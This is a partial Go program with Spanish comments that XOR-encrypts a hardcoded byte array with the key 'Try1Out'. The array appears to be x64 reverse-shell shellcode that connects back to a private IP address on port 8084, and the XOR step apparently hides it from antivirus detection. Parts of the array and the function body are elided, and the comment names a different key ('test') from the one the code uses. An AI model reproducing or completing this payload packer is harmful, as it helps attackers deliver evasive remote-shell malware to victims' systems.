...
// xorFunction realiza una operación XOR entre cada byte de input y key.
func xorFunction(input []byte, key []byte) []byte {
...
func main() {
	// Ejemplo de uso con la clave "test"
	input := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00,
		...
		0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x48,
		0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6,
		...
		0x88, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x48, 0x01, 0xd0, 0x59, 0x5a, 0x41,
		...
		0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x1f, 0x94, 0xac, 0x10, 0x77,
		0x67, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c,
	...
	key := []byte("Try1Out")
	encrypted := xorFunction(input, key)
